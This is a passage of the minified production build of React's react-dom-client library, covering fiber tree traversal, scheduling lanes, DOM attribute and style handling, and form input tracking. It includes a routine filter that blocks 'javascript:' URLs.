 * @license React
 * react-dom-client.production.js
 *
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
    var _ = requireScheduler()
      , M = requireReact()
      , j = requireReactDom();
    function O(z) {
        var J = "https://react.dev/errors/" + z;
        if (1 < arguments.length) {
            J += "?args[]=" + encodeURIComponent(arguments[1]);
            for (var le = 2; le < arguments.length; le++)
                J += "&args[]=" + encodeURIComponent(arguments[le])
        }
        return "Minified React error #" + z + "; visit " + J + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings."
    }
    function x(z) {
        return !(!z || z.nodeType !== 1 && z.nodeType !== 9 && z.nodeType !== 11)
    }
    function w(z) {
        var J = z
          , le = z;
        if (z.alternate)
            for (; J.return; )
                J = J.return;
        else {
            z = J;
            do
                J = z,
                (J.flags & 4098) !== 0 && (le = J.return),
                z = J.return;
            while (z)
        }
        return J.tag === 3 ? le : null
    }
    function b(z) {
        if (z.tag === 13) {
            var J = z.memoizedState;
            if (J === null && (z = z.alternate,
            z !== null && (J = z.memoizedState)),
            J !== null)
                return J.dehydrated
        }
        return null
    }
    function X(z) {
        if (w(z) !== z)
            throw Error(O(188))
    }
    function Y(z) {
        var J = z.alternate;
        if (!J) {
            if (J = w(z),
            J === null)
                throw Error(O(188));
            return J !== z ? null : z
        }
        for (var le = z, me = J; ; ) {
            var Se = le.return;
            if (Se === null)
                break;
            var Oe = Se.alternate;
            if (Oe === null) {
                if (me = Se.return,
                me !== null) {
                    le = me;
                    continue
                }
                break
            }
            if (Se.child === Oe.child) {
                for (Oe = Se.child; Oe; ) {
                    if (Oe === le)
                        return X(Se),
                        z;
                    if (Oe === me)
                        return X(Se),
                        J;
                    Oe = Oe.sibling
                }
                throw Error(O(188))
            }
            if (le.return !== me.return)
                le = Se,
                me = Oe;
            else {
                for (var pt = !1, bt = Se.child; bt; ) {
                    if (bt === le) {
                        pt = !0,
                        le = Se,
                        me = Oe;
                        break
                    }
                    if (bt === me) {
                        pt = !0,
                        me = Se,
                        le = Oe;
                        break
                    }
                    bt = bt.sibling
                }
                if (!pt) {
                    for (bt = Oe.child; bt; ) {
                        if (bt === le) {
                            pt = !0,
                            le = Oe,
                            me = Se;
                            break
                        }
                        if (bt === me) {
                            pt = !0,
                            me = Oe,
                            le = Se;
                            break
                        }
                        bt = bt.sibling
                    }
                    if (!pt)
                        throw Error(O(189))
                }
            }
            if (le.alternate !== me)
                throw Error(O(190))
        }
        if (le.tag !== 3)
            throw Error(O(188));
        return le.stateNode.current === le ? z : J
    }
    function F(z) {
        var J = z.tag;
        if (J === 5 || J === 26 || J === 27 || J === 6)
            return z;
        for (z = z.child; z !== null; ) {
            if (J = F(z),
            J !== null)
                return J;
            z = z.sibling
        }
        return null
    }
    var V = Object.assign
      , K = Symbol.for("react.element")
      , Q = Symbol.for("react.transitional.element")
      , ee = Symbol.for("react.portal")
      , ae = Symbol.for("react.fragment")
      , ne = Symbol.for("react.strict_mode")
      , oe = Symbol.for("react.profiler")
      , ue = Symbol.for("react.provider")
      , fe = Symbol.for("react.consumer")
      , he = Symbol.for("react.context")
      , pe = Symbol.for("react.forward_ref")
      , ye = Symbol.for("react.suspense")
      , be = Symbol.for("react.suspense_list")
      , xe = Symbol.for("react.memo")
      , Ae = Symbol.for("react.lazy")
      , Ee = Symbol.for("react.activity")
      , Be = Symbol.for("react.memo_cache_sentinel")
      , ce = Symbol.iterator;
    function q(z) {
        return z === null || typeof z != "object" ? null : (z = ce && z[ce] || z["@@iterator"],
        typeof z == "function" ? z : null)
    }
    var L = Symbol.for("react.client.reference");
    function U(z) {
        if (z == null)
            return null;
        if (typeof z == "function")
            return z.$$typeof === L ? null : z.displayName || z.name || null;
        if (typeof z == "string")
            return z;
        switch (z) {
        case ae:
            return "Fragment";
        case oe:
            return "Profiler";
        case ne:
            return "StrictMode";
        case ye:
            return "Suspense";
        case be:
            return "SuspenseList";
        case Ee:
            return "Activity"
        }
        if (typeof z == "object")
            switch (z.$$typeof) {
            case ee:
                return "Portal";
            case he:
                return (z.displayName || "Context") + ".Provider";
            case fe:
                return (z._context.displayName || "Context") + ".Consumer";
            case pe:
                var J = z.render;
                return z = z.displayName,
                z || (z = J.displayName || J.name || "",
                z = z !== "" ? "ForwardRef(" + z + ")" : "ForwardRef"),
                z;
            case xe:
                return J = z.displayName || null,
                J !== null ? J : U(z.type) || "Memo";
            case Ae:
                J = z._payload,
                z = z._init;
                try {
                    return U(z(J))
                } catch {}
            }
        return null
    }
    var Z = Array.isArray
      , te = M.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
      , se = j.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE
      , de = {
        pending: !1,
        data: null,
        method: null,
        action: null
    }
      , re = []
      , $ = -1;
    function ie(z) {
        return {
            current: z
        }
    }
    function ve(z) {
        0 > $ || (z.current = re[$],
        re[$] = null,
        $--)
    }
    function ge(z, J) {
        $++,
        re[$] = z.current,
        z.current = J
    }
    var Re = ie(null)
      , Pe = ie(null)
      , Ie = ie(null)
      , Te = ie(null);
    function Le(z, J) {
        switch (ge(Ie, J),
        ge(Pe, z),
        ge(Re, null),
        J.nodeType) {
        case 9:
        case 11:
            z = (z = J.documentElement) && (z = z.namespaceURI) ? Gd(z) : 0;
            break;
        default:
            if (z = J.tagName,
            J = J.namespaceURI)
                J = Gd(J),
                z = Wd(J, z);
            else
                switch (z) {
                case "svg":
                    z = 1;
                    break;
                case "math":
                    z = 2;
                    break;
                default:
                    z = 0
                }
        }
        ve(Re),
        ge(Re, z)
    }
    function Ze() {
        ve(Re),
        ve(Pe),
        ve(Ie)
    }
    function $e(z) {
        z.memoizedState !== null && ge(Te, z);
        var J = Re.current
          , le = Wd(J, z.type);
        J !== le && (ge(Pe, z),
        ge(Re, le))
    }
    function Ne(z) {
        Pe.current === z && (ve(Re),
        ve(Pe)),
        Te.current === z && (ve(Te),
        Jo._currentValue = de)
    }
    var qe = Object.prototype.hasOwnProperty
      , Ve = _.unstable_scheduleCallback
      , lt = _.unstable_cancelCallback
      , nt = _.unstable_shouldYield
      , je = _.unstable_requestPaint
      , Ke = _.unstable_now
      , Qe = _.unstable_getCurrentPriorityLevel
      , We = _.unstable_ImmediatePriority
      , mt = _.unstable_UserBlockingPriority
      , ct = _.unstable_NormalPriority
      , vt = _.unstable_LowPriority
      , we = _.unstable_IdlePriority
      , _e = _.log
      , Ce = _.unstable_setDisableYieldValue
      , st = null
      , et = null;
    function tt(z) {
        if (typeof _e == "function" && Ce(z),
        et && typeof et.setStrictMode == "function")
            try {
                et.setStrictMode(st, z)
            } catch {}
    }
    var He = Math.clz32 ? Math.clz32 : Ue
      , ke = Math.log
      , Me = Math.LN2;
    function Ue(z) {
        return z >>>= 0,
        z === 0 ? 32 : 31 - (ke(z) / Me | 0) | 0
    }
    var rt = 256
      , dt = 4194304;
    function Et(z) {
        var J = z & 42;
        if (J !== 0)
            return J;
        switch (z & -z) {
        case 1:
            return 1;
        case 2:
            return 2;
        case 4:
            return 4;
        case 8:
            return 8;
        case 16:
            return 16;
        case 32:
            return 32;
        case 64:
            return 64;
        case 128:
            return 128;
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return z & 4194048;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
            return z & 62914560;
        case 67108864:
            return 67108864;
        case 134217728:
            return 134217728;
        case 268435456:
            return 268435456;
        case 536870912:
            return 536870912;
        case 1073741824:
            return 0;
        default:
            return z
        }
    }
    function ft(z, J, le) {
        var me = z.pendingLanes;
        if (me === 0)
            return 0;
        var Se = 0
          , Oe = z.suspendedLanes
          , pt = z.pingedLanes;
        z = z.warmLanes;
        var bt = me & 134217727;
        return bt !== 0 ? (me = bt & ~Oe,
        me !== 0 ? Se = Et(me) : (pt &= bt,
        pt !== 0 ? Se = Et(pt) : le || (le = bt & ~z,
        le !== 0 && (Se = Et(le))))) : (bt = me & ~Oe,
        bt !== 0 ? Se = Et(bt) : pt !== 0 ? Se = Et(pt) : le || (le = me & ~z,
        le !== 0 && (Se = Et(le)))),
        Se === 0 ? 0 : J !== 0 && J !== Se && (J & Oe) === 0 && (Oe = Se & -Se,
        le = J & -J,
        Oe >= le || Oe === 32 && (le & 4194048) !== 0) ? J : Se
    }
    function gt(z, J) {
        return (z.pendingLanes & ~(z.suspendedLanes & ~z.pingedLanes) & J) === 0
    }
    function Yt(z, J) {
        switch (z) {
        case 1:
        case 2:
        case 4:
        case 8:
        case 64:
            return J + 250;
        case 16:
        case 32:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return J + 5e3;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
            return -1;
        case 67108864:
        case 134217728:
        case 268435456:
        case 536870912:
        case 1073741824:
            return -1;
        default:
            return -1
        }
    }
    function Ct() {
        var z = rt;
        return rt <<= 1,
        (rt & 4194048) === 0 && (rt = 256),
        z
    }
    function Ot() {
        var z = dt;
        return dt <<= 1,
        (dt & 62914560) === 0 && (dt = 4194304),
        z
    }
    function Vt(z) {
        for (var J = [], le = 0; 31 > le; le++)
            J.push(z);
        return J
    }
    function Pt(z, J) {
        z.pendingLanes |= J,
        J !== 268435456 && (z.suspendedLanes = 0,
        z.pingedLanes = 0,
        z.warmLanes = 0)
    }
    function Bt(z, J, le, me, Se, Oe) {
        var pt = z.pendingLanes;
        z.pendingLanes = le,
        z.suspendedLanes = 0,
        z.pingedLanes = 0,
        z.warmLanes = 0,
        z.expiredLanes &= le,
        z.entangledLanes &= le,
        z.errorRecoveryDisabledLanes &= le,
        z.shellSuspendCounter = 0;
        var bt = z.entanglements
          , Mt = z.expirationTimes
          , Ut = z.hiddenUpdates;
        for (le = pt & ~le; 0 < le; ) {
            var Jt = 31 - He(le)
              , rr = 1 << Jt;
            bt[Jt] = 0,
            Mt[Jt] = -1;
            var zt = Ut[Jt];
            if (zt !== null)
                for (Ut[Jt] = null,
                Jt = 0; Jt < zt.length; Jt++) {
                    var Ht = zt[Jt];
                    Ht !== null && (Ht.lane &= -536870913)
                }
            le &= ~rr
        }
        me !== 0 && xr(z, me, 0),
        Oe !== 0 && Se === 0 && z.tag !== 0 && (z.suspendedLanes |= Oe & ~(pt & ~J))
    }
    function xr(z, J, le) {
        z.pendingLanes |= J,
        z.suspendedLanes &= ~J;
        var me = 31 - He(J);
        z.entangledLanes |= J,
        z.entanglements[me] = z.entanglements[me] | 1073741824 | le & 4194090
    }
    function Dt(z, J) {
        var le = z.entangledLanes |= J;
        for (z = z.entanglements; le; ) {
            var me = 31 - He(le)
              , Se = 1 << me;
            Se & J | z[me] & J && (z[me] |= J),
            le &= ~Se
        }
    }
    function Ft(z) {
        switch (z) {
        case 2:
            z = 1;
            break;
        case 8:
            z = 4;
            break;
        case 32:
            z = 16;
            break;
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
            z = 128;
            break;
        case 268435456:
            z = 134217728;
            break;
        default:
            z = 0
        }
        return z
    }
    function Mr(z) {
        return z &= -z,
        2 < z ? 8 < z ? (z & 134217727) !== 0 ? 32 : 268435456 : 8 : 2
    }
    function at() {
        var z = se.p;
        return z !== 0 ? z : (z = window.event,
        z === void 0 ? 32 : mh(z.type))
    }
    function ze(z, J) {
        var le = se.p;
        try {
            return se.p = z,
            J()
        } finally {
            se.p = le
        }
    }
    var Je = Math.random().toString(36).slice(2)
      , ht = "__reactFiber$" + Je
      , _t = "__reactProps$" + Je
      , Ge = "__reactContainer$" + Je
      , Ye = "__reactEvents$" + Je
      , it = "__reactListeners$" + Je
      , Fe = "__reactHandles$" + Je
      , ut = "__reactResources$" + Je
      , wt = "__reactMarker$" + Je;
    function At(z) {
        delete z[ht],
        delete z[_t],
        delete z[Ye],
        delete z[it],
        delete z[Fe]
    }
    function St(z) {
        var J = z[ht];
        if (J)
            return J;
        for (var le = z.parentNode; le; ) {
            if (J = le[Ge] || le[ht]) {
                if (le = J.alternate,
                J.child !== null || le !== null && le.child !== null)
                    for (z = Jd(z); z !== null; ) {
                        if (le = z[ht])
                            return le;
                        z = Jd(z)
                    }
                return J
            }
            z = le,
            le = z.parentNode
        }
        return null
    }
    function Tt(z) {
        if (z = z[ht] || z[Ge]) {
            var J = z.tag;
            if (J === 5 || J === 6 || J === 13 || J === 26 || J === 27 || J === 3)
                return z
        }
        return null
    }
    function er(z) {
        var J = z.tag;
        if (J === 5 || J === 26 || J === 27 || J === 6)
            return z.stateNode;
        throw Error(O(33))
    }
    function Xt(z) {
        var J = z[ut];
        return J || (J = z[ut] = {
            hoistableStyles: new Map,
            hoistableScripts: new Map
        }),
        J
    }
    function pr(z) {
        z[wt] = !0
    }
    var or = new Set
      , yr = {};
    function vr(z, J) {
        gr(z, J),
        gr(z + "Capture", J)
    }
    function gr(z, J) {
        for (yr[z] = J,
        z = 0; z < J.length; z++)
            or.add(J[z])
    }
    var Sr = RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$")
      , br = {}
      , _r = {};
    function wr(z) {
        return qe.call(_r, z) ? !0 : qe.call(br, z) ? !1 : Sr.test(z) ? _r[z] = !0 : (br[z] = !0,
        !1)
    }
    function sr(z, J, le) {
        if (wr(J))
            if (le === null)
                z.removeAttribute(J);
            else {
                switch (typeof le) {
                case "undefined":
                case "function":
                case "symbol":
                    z.removeAttribute(J);
                    return;
                case "boolean":
                    var me = J.toLowerCase().slice(0, 5);
                    if (me !== "data-" && me !== "aria-") {
                        z.removeAttribute(J);
                        return
                    }
                }
                z.setAttribute(J, "" + le)
            }
    }
    function dr(z, J, le) {
        if (le === null)
            z.removeAttribute(J);
        else {
            switch (typeof le) {
            case "undefined":
            case "function":
            case "symbol":
            case "boolean":
                z.removeAttribute(J);
                return
            }
            z.setAttribute(J, "" + le)
        }
    }
    function nr(z, J, le, me) {
        if (me === null)
            z.removeAttribute(le);
        else {
            switch (typeof me) {
            case "undefined":
            case "function":
            case "symbol":
            case "boolean":
                z.removeAttribute(le);
                return
            }
            z.setAttributeNS(J, le, "" + me)
        }
    }
    var lr, fr;
    function ir(z) {
        if (lr === void 0)
            try {
                throw Error()
            } catch (le) {
                var J = le.stack.trim().match(/\n( *(at )?)/);
                lr = J && J[1] || "",
                fr = -1 < le.stack.indexOf(`
    at`) ? " (<anonymous>)" : -1 < le.stack.indexOf("@") ? "@unknown:0:0" : ""
            }
        return `
` + lr + z + fr
    }
    var $t = !1;
    function Nt(z, J) {
        if (!z || $t)
            return "";
        $t = !0;
        var le = Error.prepareStackTrace;
        Error.prepareStackTrace = void 0;
        try {
            var me = {
                DetermineComponentFrameRoot: function() {
                    try {
                        if (J) {
                            var rr = function() {
                                throw Error()
                            };
                            if (Object.defineProperty(rr.prototype, "props", {
                                set: function() {
                                    throw Error()
                                }
                            }),
                            typeof Reflect == "object" && Reflect.construct) {
                                try {
                                    Reflect.construct(rr, [])
                                } catch (Ht) {
                                    var zt = Ht
                                }
                                Reflect.construct(z, [], rr)
                            } else {
                                try {
                                    rr.call()
                                } catch (Ht) {
                                    zt = Ht
                                }
                                z.call(rr.prototype)
                            }
                        } else {
                            try {
                                throw Error()
                            } catch (Ht) {
                                zt = Ht
                            }
                            (rr = z()) && typeof rr.catch == "function" && rr.catch(function() {})
                        }
                    } catch (Ht) {
                        if (Ht && zt && typeof Ht.stack == "string")
                            return [Ht.stack, zt.stack]
                    }
                    return [null, null]
                }
            };
            me.DetermineComponentFrameRoot.displayName = "DetermineComponentFrameRoot";
            var Se = Object.getOwnPropertyDescriptor(me.DetermineComponentFrameRoot, "name");
            Se && Se.configurable && Object.defineProperty(me.DetermineComponentFrameRoot, "name", {
                value: "DetermineComponentFrameRoot"
            });
            var Oe = me.DetermineComponentFrameRoot()
              , pt = Oe[0]
              , bt = Oe[1];
            if (pt && bt) {
                var Mt = pt.split(`
`)
                  , Ut = bt.split(`
`);
                for (Se = me = 0; me < Mt.length && !Mt[me].includes("DetermineComponentFrameRoot"); )
                    me++;
                for (; Se < Ut.length && !Ut[Se].includes("DetermineComponentFrameRoot"); )
                    Se++;
                if (me === Mt.length || Se === Ut.length)
                    for (me = Mt.length - 1,
                    Se = Ut.length - 1; 1 <= me && 0 <= Se && Mt[me] !== Ut[Se]; )
                        Se--;
                for (; 1 <= me && 0 <= Se; me--,
                Se--)
                    if (Mt[me] !== Ut[Se]) {
                        if (me !== 1 || Se !== 1)
                            do
                                if (me--,
                                Se--,
                                0 > Se || Mt[me] !== Ut[Se]) {
                                    var Jt = `
` + Mt[me].replace(" at new ", " at ");
                                    return z.displayName && Jt.includes("<anonymous>") && (Jt = Jt.replace("<anonymous>", z.displayName)),
                                    Jt
                                }
                            while (1 <= me && 0 <= Se);
                        break
                    }
            }
        } finally {
            $t = !1,
            Error.prepareStackTrace = le
        }
        return (le = z ? z.displayName || z.name : "") ? ir(le) : ""
    }
    function ar(z) {
        switch (z.tag) {
        case 26:
        case 27:
        case 5:
            return ir(z.type);
        case 16:
            return ir("Lazy");
        case 13:
            return ir("Suspense");
        case 19:
            return ir("SuspenseList");
        case 0:
        case 15:
            return Nt(z.type, !1);
        case 11:
            return Nt(z.type.render, !1);
        case 1:
            return Nt(z.type, !0);
        case 31:
            return ir("Activity");
        default:
            return ""
        }
    }
    function Zt(z) {
        try {
            var J = "";
            do
                J += ar(z),
                z = z.return;
            while (z);
            return J
        } catch (le) {
            return `
Error generating stack: ` + le.message + `
` + le.stack
        }
    }
    function Gt(z) {
        switch (typeof z) {
        case "bigint":
        case "boolean":
        case "number":
        case "string":
        case "undefined":
            return z;
        case "object":
            return z;
        default:
            return ""
        }
    }
    function ur(z) {
        var J = z.type;
        return (z = z.nodeName) && z.toLowerCase() === "input" && (J === "checkbox" || J === "radio")
    }
    function Tr(z) {
        var J = ur(z) ? "checked" : "value"
          , le = Object.getOwnPropertyDescriptor(z.constructor.prototype, J)
          , me = "" + z[J];
        if (!z.hasOwnProperty(J) && typeof le < "u" && typeof le.get == "function" && typeof le.set == "function") {
            var Se = le.get
              , Oe = le.set;
            return Object.defineProperty(z, J, {
                configurable: !0,
                get: function() {
                    return Se.call(this)
                },
                set: function(pt) {
                    me = "" + pt,
                    Oe.call(this, pt)
                }
            }),
            Object.defineProperty(z, J, {
                enumerable: le.enumerable
            }),
            {
                getValue: function() {
                    return me
                },
                setValue: function(pt) {
                    me = "" + pt
                },
                stopTracking: function() {
                    z._valueTracker = null,
                    delete z[J]
                }
            }
        }
    }
    function Or(z) {
        z._valueTracker || (z._valueTracker = Tr(z))
    }
    function Nr(z) {
        if (!z)
            return !1;
        var J = z._valueTracker;
        if (!J)
            return !0;
        var le = J.getValue()
          , me = "";
        return z && (me = ur(z) ? z.checked ? "true" : "false" : z.value),
        z = me,
        z !== le ? (J.setValue(z),
        !0) : !1
    }
    function Br(z) {
        if (z = z || (typeof document < "u" ? document : void 0),
        typeof z > "u")
            return null;
        try {
            return z.activeElement || z.body
        } catch {
            return z.body
        }
    }
    var Rt = /[\n"\\]/g;
    function Cr(z) {
        return z.replace(Rt, function(J) {
            return "\\" + J.charCodeAt(0).toString(16) + " "
        })
    }
    function Lr(z, J, le, me, Se, Oe, pt, bt) {
        z.name = "",
        pt != null && typeof pt != "function" && typeof pt != "symbol" && typeof pt != "boolean" ? z.type = pt : z.removeAttribute("type"),
        J != null ? pt === "number" ? (J === 0 && z.value === "" || z.value != J) && (z.value = "" + Gt(J)) : z.value !== "" + Gt(J) && (z.value = "" + Gt(J)) : pt !== "submit" && pt !== "reset" || z.removeAttribute("value"),
        J != null ? Dr(z, pt, Gt(J)) : le != null ? Dr(z, pt, Gt(le)) : me != null && z.removeAttribute("value"),
        Se == null && Oe != null && (z.defaultChecked = !!Oe),
        Se != null && (z.checked = Se && typeof Se != "function" && typeof Se != "symbol"),
        bt != null && typeof bt != "function" && typeof bt != "symbol" && typeof bt != "boolean" ? z.name = "" + Gt(bt) : z.removeAttribute("name")
    }
    function Ur(z, J, le, me, Se, Oe, pt, bt) {
        if (Oe != null && typeof Oe != "function" && typeof Oe != "symbol" && typeof Oe != "boolean" && (z.type = Oe),
        J != null || le != null) {
            if (!(Oe !== "submit" && Oe !== "reset" || J != null))
                return;
            le = le != null ? "" + Gt(le) : "",
            J = J != null ? "" + Gt(J) : le,
            bt || J === z.value || (z.value = J),
            z.defaultValue = J
        }
        me = me ?? Se,
        me = typeof me != "function" && typeof me != "symbol" && !!me,
        z.checked = bt ? z.checked : !!me,
        z.defaultChecked = !!me,
        pt != null && typeof pt != "function" && typeof pt != "symbol" && typeof pt != "boolean" && (z.name = pt)
    }
    function Dr(z, J, le) {
        J === "number" && Br(z.ownerDocument) === z || z.defaultValue === "" + le || (z.defaultValue = "" + le)
    }
    function Xe(z, J, le, me) {
        if (z = z.options,
        J) {
            J = {};
            for (var Se = 0; Se < le.length; Se++)
                J["$" + le[Se]] = !0;
            for (le = 0; le < z.length; le++)
                Se = J.hasOwnProperty("$" + z[le].value),
                z[le].selected !== Se && (z[le].selected = Se),
                Se && me && (z[le].defaultSelected = !0)
        } else {
            for (le = "" + Gt(le),
            J = null,
            Se = 0; Se < z.length; Se++) {
                if (z[Se].value === le) {
                    z[Se].selected = !0,
                    me && (z[Se].defaultSelected = !0);
                    return
                }
                J !== null || z[Se].disabled || (J = z[Se])
            }
            J !== null && (J.selected = !0)
        }
    }
    function cr(z, J, le) {
        if (J != null && (J = "" + Gt(J),
        J !== z.value && (z.value = J),
        le == null)) {
            z.defaultValue !== J && (z.defaultValue = J);
            return
        }
        z.defaultValue = le != null ? "" + Gt(le) : ""
    }
    function en(z, J, le, me) {
        if (J == null) {
            if (me != null) {
                if (le != null)
                    throw Error(O(92));
                if (Z(me)) {
                    if (1 < me.length)
                        throw Error(O(93));
                    me = me[0]
                }
                le = me
            }
            le == null && (le = ""),
            J = le
        }
        le = Gt(J),
        z.defaultValue = le,
        me = z.textContent,
        me === le && me !== "" && me !== null && (z.value = me)
    }
    function jr(z, J) {
        if (J) {
            var le = z.firstChild;
            if (le && le === z.lastChild && le.nodeType === 3) {
                le.nodeValue = J;
                return
            }
        }
        z.textContent = J
    }
    var tn = new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));
    function rn(z, J, le) {
        var me = J.indexOf("--") === 0;
        le == null || typeof le == "boolean" || le === "" ? me ? z.setProperty(J, "") : J === "float" ? z.cssFloat = "" : z[J] = "" : me ? z.setProperty(J, le) : typeof le != "number" || le === 0 || tn.has(J) ? J === "float" ? z.cssFloat = le : z[J] = ("" + le).trim() : z[J] = le + "px"
    }
    function Kt(z, J, le) {
        if (J != null && typeof J != "object")
            throw Error(O(62));
        if (z = z.style,
        le != null) {
            for (var me in le)
                !le.hasOwnProperty(me) || J != null && J.hasOwnProperty(me) || (me.indexOf("--") === 0 ? z.setProperty(me, "") : me === "float" ? z.cssFloat = "" : z[me] = "");
            for (var Se in J)
                me = J[Se],
                J.hasOwnProperty(Se) && le[Se] !== me && rn(z, Se, me)
        } else
            for (var Oe in J)
                J.hasOwnProperty(Oe) && rn(z, Oe, J[Oe])
    }
    function Qt(z) {
        if (z.indexOf("-") === -1)
            return !1;
        switch (z) {
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
            return !1;
        default:
            return !0
        }
    }
    var pn = new Map([["acceptCharset", "accept-charset"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"], ["crossOrigin", "crossorigin"], ["accentHeight", "accent-height"], ["alignmentBaseline", "alignment-baseline"], ["arabicForm", "arabic-form"], ["baselineShift", "baseline-shift"], ["capHeight", "cap-height"], ["clipPath", "clip-path"], ["clipRule", "clip-rule"], ["colorInterpolation", "color-interpolation"], ["colorInterpolationFilters", "color-interpolation-filters"], ["colorProfile", "color-profile"], ["colorRendering", "color-rendering"], ["dominantBaseline", "dominant-baseline"], ["enableBackground", "enable-background"], ["fillOpacity", "fill-opacity"], ["fillRule", "fill-rule"], ["floodColor", "flood-color"], ["floodOpacity", "flood-opacity"], ["fontFamily", "font-family"], ["fontSize", "font-size"], ["fontSizeAdjust", "font-size-adjust"], ["fontStretch", "font-stretch"], ["fontStyle", "font-style"], ["fontVariant", "font-variant"], ["fontWeight", "font-weight"], ["glyphName", "glyph-name"], ["glyphOrientationHorizontal", "glyph-orientation-horizontal"], ["glyphOrientationVertical", "glyph-orientation-vertical"], ["horizAdvX", "horiz-adv-x"], ["horizOriginX", "horiz-origin-x"], ["imageRendering", "image-rendering"], ["letterSpacing", "letter-spacing"], ["lightingColor", "lighting-color"], ["markerEnd", "marker-end"], ["markerMid", "marker-mid"], ["markerStart", "marker-start"], ["overlinePosition", "overline-position"], ["overlineThickness", "overline-thickness"], ["paintOrder", "paint-order"], ["panose-1", "panose-1"], ["pointerEvents", "pointer-events"], ["renderingIntent", "rendering-intent"], ["shapeRendering", "shape-rendering"], ["stopColor", "stop-color"], ["stopOpacity", "stop-opacity"], ["strikethroughPosition", "strikethrough-position"], ["strikethroughThickness", "strikethrough-thickness"], ["strokeDasharray", "stroke-dasharray"], ["strokeDashoffset", "stroke-dashoffset"], ["strokeLinecap", "stroke-linecap"], ["strokeLinejoin", "stroke-linejoin"], ["strokeMiterlimit", "stroke-miterlimit"], ["strokeOpacity", "stroke-opacity"], ["strokeWidth", "stroke-width"], ["textAnchor", "text-anchor"], ["textDecoration", "text-decoration"], ["textRendering", "text-rendering"], ["transformOrigin", "transform-origin"], ["underlinePosition", "underline-position"], ["underlineThickness", "underline-thickness"], ["unicodeBidi", "unicode-bidi"], ["unicodeRange", "unicode-range"], ["unitsPerEm", "units-per-em"], ["vAlphabetic", "v-alphabetic"], ["vHanging", "v-hanging"], ["vIdeographic", "v-ideographic"], ["vMathematical", "v-mathematical"], ["vectorEffect", "vector-effect"], ["vertAdvY", "vert-adv-y"], ["vertOriginX", "vert-origin-x"], ["vertOriginY", "vert-origin-y"], ["wordSpacing", "word-spacing"], ["writingMode", "writing-mode"], ["xmlnsXlink", "xmlns:xlink"], ["xHeight", "x-height"]])
      , Xr = /^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
    function Fr(z) {
        return Xr.test("" + z) ? "javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')" : z
    }
    var ia = null;
    function hr(z) {
        return z = z.target || z.srcElement || window,
        z.correspondingUseElement && (z = z.correspondingUseElement),
        z.nodeType === 3 ? z.parentNode : z
    }
    var Oi = null
      , yi = null;
    function so(z) {
        var J = Tt(z);
        if (J && (z = J.stateNode)) {
            var le = z[_t] || null;
            e: switch (z = J.stateNode,
            J.type) {
            case "input":
                if (Lr(z, le.value, le.defaultValue, le.defaultValue, le.checked, le.defaultChecked, le.type, le.name),
                J = le.name,
                le.type === "radio" && J != null) {
                    for (le = z; le.parentNode; )
                        le = le.parentNode;
                    for (le = le.querySelectorAll('input[name="' + Cr("" + J) + '"][type="radio"]'),
                    J = 0; J < le.length; J++) {
                        var me = le[J];
                        if (me !== z && me.form === z.form) {
                            var Se = me[_t] || null;
                            if (!Se)
                                throw Error(O(90));
                            Lr(me, Se.value, Se.defaultValue, Se.defaultValue, Se.checked, Se.defaultChecked, Se.type, Se.name)
                        }
                    }
                    for (J = 0; J < le.length; J++)
                        me = le[J],
                        me.form === z.form && Nr(me)
                }
                break e;
            case "textarea":
                cr(z, le.value, le.defaultValue);
                break e;
            case "select":
                J = le.value,
                J != null && Xe(z, !!le.multiple, J, !1)
            }
        }
    }
